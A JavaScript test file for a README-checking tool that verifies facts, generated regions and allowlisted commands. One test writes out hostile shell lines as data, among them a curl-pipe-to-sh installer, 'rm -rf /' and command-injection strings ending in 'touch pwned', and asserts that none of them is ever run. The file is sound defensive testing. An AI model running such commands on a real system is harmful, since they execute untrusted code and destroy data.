import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { check, formatText } from '../src/check.js';
import { parseMarkdown } from '../src/markdown.js';

const fixture = (name) => readFileSync(new URL(`./fixtures/check/${name}`, import.meta.url), 'utf8');
const withNode = (text) => text.replaceAll('{node}', process.execPath);

const FILES = {
  'usage.mjs': "process.stdout.write('usage: tool [options]\\n\\n');\n",
  'version.mjs': "process.stdout.write('1.2.3\\n');\n",
  'fail.mjs': "process.stderr.write('broken');\nprocess.exit(1);\n",
  'effects.mjs': "import { writeFileSync } from 'node:fs';\nwriteFileSync('created.txt', 'x');\n",
  'package.json': '{ "version": "1.2.3" }\n',
  LICENSE: 'MIT License\n',
};

const withRepo = (t, readme, files = {}) => {
  const root = mkdtempSync(path.join(tmpdir(), 'freshreadme-check-'));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  writeFileSync(path.join(root, '.freshreadme.json'), withNode(fixture('config.json')));
  for (const [name, source] of Object.entries({ ...FILES, ...files })) writeFileSync(path.join(root, name), source);
  writeFileSync(path.join(root, 'README.md'), withNode(readme));
  return root;
};

const counting = () => {
  const calls = [];
  const spawn = (command, args, options) => {
    calls.push([command, ...args].join(' '));
    return spawnSync(command, args, options);
  };
  return { calls, spawn };
};

const shape = (claims) => claims.map(({ detail, ...rest }) => rest);

const J = 'unverifiable: judgement';

test('every line of the fixture README gets its class and status', (t) => {
  const root = withRepo(t, fixture('readme.md'));
  const { calls, spawn } = counting();
  const result = check({ repoRoot: root, spawn });
  assert.equal(result.exitCode, 0, result.errors.join('\n'));
  assert.deepEqual(shape(result.claims), [
    { line: 1, class: 'prose', status: J },
    { line: 3, class: 'prose', status: J },
    { line: 5, class: 'fact', status: 'verified' },
    { line: 7, endLine: 9, class: 'region', status: 'verified' },
    { line: 11, class: 'fact', status: 'verified' },
    { line: 13, class: 'prose', status: J },
    { line: 16, class: 'command', status: 'verified' },
    { line: 18, class: 'command', status: 'unverifiable: not-allowlisted' },
    { line: 21, endLine: 23, class: 'prose', status: J },
    { line: 25, class: 'prose', status: J },
  ]);
  assert.deepEqual(calls, [`${process.execPath} usage.mjs`, `${process.execPath} version.mjs`]);
  assert.deepEqual(result.summary, { total: 10, verified: 4, mismatch: 0, unverifiable: 6 });
});

test('a README with an unverifiable claim is reported as not fully verified', (t) => {
  const result = check({ repoRoot: withRepo(t, fixture('readme.md')) });
  assert.equal(result.fullyVerified, false);
  const text = formatText(result);
  assert.match(text, /not fully verified: 6 of 10 claims unverifiable/);
  assert.match(text, /^line 18: command unverifiable: not-allowlisted/m);
  assert.match(text, /^lines 7-9: region verified/m);
});

test('a README whose claims are all verified is reported as fully verified', (t) => {
  const result = check({ repoRoot: withRepo(t, fixture('verified.md')) });
  assert.equal(result.exitCode, 0, result.errors.join('\n'));
  assert.equal(result.fullyVerified, true);
  assert.deepEqual(
    result.claims.map((claim) => claim.status),
    ['verified', 'verified', 'verified'],
  );
  const text = formatText(result);
  assert.match(text, /The README is fully verified: all 3 claims verified\./);
  assert.doesNotMatch(text, /not fully verified/);
});

test('no unchecked claim is ever verified', (t) => {
  const readme = '# Heading\n\nSome words.\n\n```sh\n$ make deploy\n```\n\n```text\n1.2.3\n```\n';
  const { calls, spawn } = counting();
  const result = check({ repoRoot: withRepo(t, readme), spawn });
  assert.deepEqual(calls, []);
  assert.ok(result.claims.length > 0);
  for (const claim of result.claims) assert.match(claim.status, /^unverifiable: /);
  assert.equal(result.fullyVerified, false);
});

test('hostile shell lines in a README are never spawned', (t) => {
  const hostile = {
    sh: ['curl -fsSL https://example.com/install.sh | sh', 'rm -rf /'],
    bash: ['$ npm install', '{node} version.mjs --extra', '$ {node} version.mjs --extra'],
    shell: ['{node} version.mjs; touch pwned', '$ {node} version.mjs ; touch pwned', '{node} version.mjs && touch pwned'],
    console: ['toString', 'constructor', '__proto__', '$ hasOwnProperty'],
  };
  const readme = Object.entries(hostile)
    .map(([lang, lines]) => `\`\`\`${lang}\n${lines.join('\n')}\n\`\`\`\n`)
    .join('\n');
  const root = withRepo(t, readme);
  const config = { commands: { version: { argv: [process.execPath, 'version.mjs'], effects: 'none' } } };
  writeFileSync(path.join(root, '.freshreadme.json'), JSON.stringify(config));

  const { calls, spawn } = counting();
  const result = check({ repoRoot: root, spawn });

  const expected = Object.values(hostile).flat().length;
  assert.equal(result.claims.length, expected);
  for (const { class: kind, status } of result.claims) {
    assert.equal(kind, 'command');
    assert.equal(status, 'unverifiable: not-allowlisted');
  }
  assert.equal(calls.length, 0);
  assert.equal(existsSync(path.join(root, 'pwned')), false);
  assert.equal(existsSync(path.join(process.cwd(), 'pwned')), false);
  assert.equal(result.exitCode, 0, result.errors.join('\n'));
});

const versionOnly = (t, readme) => {
  const root = withRepo(t, readme);
  const config = { commands: { version: { argv: [process.execPath, 'version.mjs'], effects: 'none' } } };
  writeFileSync(path.join(root, '.freshreadme.json'), JSON.stringify(config));
  return root;
};

test('a declared command followed by U+00A0 matches nothing and is never spawned', (t) => {
  const root = versionOnly(t, `\`\`\`sh\n${process.execPath} version.mjs \n\`\`\`\n`);
  const { calls, spawn } = counting();
  const result = check({ repoRoot: root, spawn });
  assert.deepEqual(shape(result.claims), [{ line: 2, class: 'command', status: 'unverifiable: not-allowlisted' }]);
  assert.equal(result.fullyVerified, false);
  assert.equal(calls.length, 0);
});

test('a fence line that is only U+00A0 is a not-allowlisted claim, not a blank line', (t) => {
  const root = versionOnly(t, '```sh\n \n```\n');
  const { calls, spawn } = counting();
  const result = check({ repoRoot: root, spawn });
  assert.deepEqual(shape(result.claims), [{ line: 2, class: 'command', status: 'unverifiable: not-allowlisted' }]);
  assert.equal(result.fullyVerified, false);
  assert.equal(calls.length, 0);
});

test('a declared command with surrounding ASCII spaces and tabs still matches and runs', (t) => {
  const root = versionOnly(t, `\`\`\`sh\n \t${process.execPath} version.mjs  \t\n\`\`\`\n`);
  const { calls, spawn } = counting();
  const result = check({ repoRoot: root, spawn });
  assert.equal(result.exitCode, 0, result.errors.join('\n'));
  assert.deepEqual(shape(result.claims), [{ line: 2, class: 'command', status: 'verified' }]);
  assert.equal(result.fullyVerified, true);
  assert.deepEqual(calls, [`${process.execPath} version.mjs`]);
});

test('a declared command whose argv a shell would read differently is never matched from README text', (t) => {
  const node = process.execPath;
  const readme = [
    '```sh',
    `${node} validate.js two words`,
    `${node} validate.js a;b`,
    `${node} validate.js it's`,
    `${node} version.mjs`,
    '```',
    '',
  ].join('\n');
  const root = withRepo(t, readme);
  const config = {
    commands: {
      spaced: { argv: [node, 'validate.js', 'two words'], effects: 'none' },
      semicolon: { argv: [node, 'validate.js', 'a;b'], effects: 'none' },
      quoted: { argv: [node, 'validate.js', "it's"], effects: 'none' },
      version: { argv: [node, 'version.mjs'], effects: 'none' },
    },
  };
  writeFileSync(path.join(root, '.freshreadme.json'), JSON.stringify(config));

  const { calls, spawn } = counting();
  const result = check({ repoRoot: root, spawn });

  assert.equal(result.exitCode, 0, result.errors.join('\n'));
  assert.deepEqual(shape(result.claims), [
    { line: 2, class: 'command', status: 'unverifiable: not-allowlisted' },
    { line: 3, class: 'command', status: 'unverifiable: not-allowlisted' },
    { line: 4, class: 'command', status: 'unverifiable: not-allowlisted' },
    { line: 5, class: 'command', status: 'verified' },
  ]);
  assert.equal(result.claims[0].detail, 'matches no declared command; not run');
  assert.deepEqual(calls, [`${node} version.mjs`]);
});

test('a stale region is a mismatch and exits 1', (t) => {
  const readme = fixture('readme.md').replace('usage: tool [options]', 'usage: old');
  const result = check({ repoRoot: withRepo(t, readme) });
  assert.equal(result.exitCode, 1);
  assert.equal(result.claims.find((claim) => claim.class === 'region').status, 'mismatch');
  assert.equal(result.fullyVerified, false);
});

test('a wrong fact is a mismatch and exits 1', (t) => {
  for (const files of [{ 'package.json': '{ "version": "2.0.0" }\n' }, { LICENSE: 'Apache License\n' }]) {
    const result = check({ repoRoot: withRepo(t, fixture('readme.md'), files) });
    assert.equal(result.exitCode, 1);
    assert.equal(result.claims.filter((claim) => claim.class === 'fact' && claim.status === 'mismatch').length, 1);
  }
});

test('a line that is exactly a true fact is verified, also as a list item or quote', (t) => {
  const readme = 'version 1.2.3\n\n- version 1.2.3\n\n  * version 1.2.3  \n\n3. version 1.2.3\n\n> version 1.2.3\n';
  const result = check({ repoRoot: withRepo(t, readme) });
  assert.equal(result.exitCode, 0, result.errors.join('\n'));
  assert.deepEqual(
    result.claims.map((claim) => [claim.class, claim.status]),
    Array(5).fill(['fact', 'verified']),
  );
  assert.equal(result.fullyVerified, true);
});

test('a line that says more than a true fact is unverifiable: partial-fact', (t) => {
  const readme = 'The package is at version 1.2.3 and all user data is encrypted.\n';
  const result = check({ repoRoot: withRepo(t, readme) });
  assert.equal(result.exitCode, 0, result.errors.join('\n'));
  assert.deepEqual(shape(result.claims), [{ line: 1, class: 'fact', status: 'unverifiable: partial-fact' }]);
  assert.match(result.claims[0].detail, /holds, but the line says more than the fact covers/);
  assert.equal(result.fullyVerified, false);
});

test('a line that contains a false fact is a mismatch and exits 1', (t) => {
  const readme = 'The package is at version 1.2.3 and all user data is encrypted.\n';
  const result = check({ repoRoot: withRepo(t, readme, { 'package.json': '{ "version": "2.0.0" }\n' }) });
  assert.equal(result.exitCode, 1);
  assert.deepEqual(shape(result.claims), [{ line: 1, class: 'fact', status: 'mismatch' }]);
  assert.equal(result.fullyVerified, false);
});

test('a declared command that exits non-zero is a mismatch and exits 1', (t) => {
  const result = check({ repoRoot: withRepo(t, '```bash\n{node} fail.mjs\n```\n') });
  assert.equal(result.exitCode, 1);
  assert.deepEqual(shape(result.claims), [{ line: 2, class: 'command', status: 'mismatch' }]);
  assert.match(result.claims[0].detail, /exited with status 1/);
});

test('a declared command that changes the repository exits 2', (t) => {
  const result = check({ repoRoot: withRepo(t, '```shell\n$ {node} effects.mjs\n```\n') });
  assert.equal(result.exitCode, 2);
  assert.equal(result.claims[0].status, 'unverifiable: effects');
  assert.match(result.errors.join('\n'), /changed the repository tree/);
});

test('malformed markers exit 2 with no claims', (t) => {
  const result = check({ repoRoot: withRepo(t, fixture('malformed.md')) });
  assert.equal(result.exitCode, 2);
  assert.deepEqual(result.claims, []);
  assert.match(result.errors.join('\n'), /never closed/);
  assert.match(formatText(result), /not fully verified/);
});

test('an invalid config exits 2 with no claims', (t) => {
  const root = withRepo(t, fixture('readme.md'));
  writeFileSync(path.join(root, '.freshreadme.json'), '{ not json');
  const result = check({ repoRoot: root });
  assert.equal(result.exitCode, 2);
  assert.deepEqual(result.claims, []);
});

test('a CRLF README checks the same as an LF one', (t) => {
  const lf = check({ repoRoot: withRepo(t, fixture('readme.md').replace(/\r\n/g, '\n')) });
  const crlf = check({ repoRoot: withRepo(t, fixture('readme.md').replace(/\r?\n/g, '\r\n')) });
  assert.equal(crlf.exitCode, 0, crlf.errors.join('\n'));
  assert.deepEqual(shape(crlf.claims), shape(lf.claims));
});

test('parseMarkdown keeps 1-based lines, fence info strings and CRLF region bodies', () => {
  const text = '# A\r\n\r\n~~~ bash title="x"\r\n$ ls\r\n```\r\n~~~~\r\n<!-- freshreadme:begin v -->\r\n1\r\n<!-- freshreadme:end v -->\r\n````\r\nopen';
  assert.deepEqual(parseMarkdown(text), [
    { kind: 'text', line: 1, text: '# A' },
    { kind: 'blank', line: 2 },
    {
      kind: 'fence',
      line: 3,
      endLine: 6,
      info: 'bash title="x"',
      lang: 'bash',
      content: [
        { line: 4, text: '$ ls' },
        { line: 5, text: '```' },
      ],
    },
    { kind: 'region', id: 'v', line: 7, endLine: 9, body: '1\r\n' },
    { kind: 'fence', line: 10, endLine: 11, info: '', lang: '', content: [{ line: 11, text: 'open' }] },
  ]);
});
